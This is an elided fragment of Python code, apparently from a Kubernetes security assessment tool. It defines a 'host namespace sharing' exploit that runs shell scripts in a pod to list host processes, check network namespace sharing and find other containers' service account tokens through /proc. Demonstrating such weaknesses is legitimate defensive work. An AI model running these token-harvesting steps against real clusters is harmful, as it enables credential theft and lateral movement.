...
class HostNamespaceSharingExploit(BaseExploit):
    ...
    def get_default_service(self) -> str:
        """Get the default service for host namespace sharing exploit."""
    ...
    def demonstrate(self) -> ExploitResult:
                ...
                if [ "$total_procs" -gt 50 ]; then
                    ...
                    for pid in $(ls /proc | grep -E "^[0-9]+$" | head -20); do
                        if [ -r "/proc/$pid/environ" ] && \\
                           grep -q "KUBERNETES\\|DOCKER" "/proc/$pid/environ" 2>/dev/null; then
        ...
        try:
            result = self.k8s.exec_in_pod(
                ...
                if [ "$iface_count" -gt 5 ]; then
                    ...
                    netstat -tun 2>/dev/null | tail -n +3 | wc -l || \\
                      ss -tun | tail -n +2 | wc -l || echo "  Cannot count"
            ...
            if "Using host network namespace" in result:
                evidence.append("Host network namespace access confirmed (hostNetwork=true)")
        ...
        try:
            ...
            result = self.k8s.exec_in_pod(
                ...
                for pid in $(ls /proc 2>/dev/null | grep -E "^[0-9]+$" | head -50); do
                    token_path="/proc/$pid/root/var/run/secrets/" \\
                               "kubernetes.io/serviceaccount/token"
                    if [ -f "$token_path" ] && [ -r "$token_path" ]; then
                        if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
                            our_token=$(head -c 50 \\
                              /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "none")
            ...
            if "Found service account token" in result:
                evidence.append("Can steal service account tokens from other containers")
        ...
        try:
            ...
            if "[!] ipcs command not available" in result:
                evidence.append("IPC tools unavailable, but shared memory access still possible")
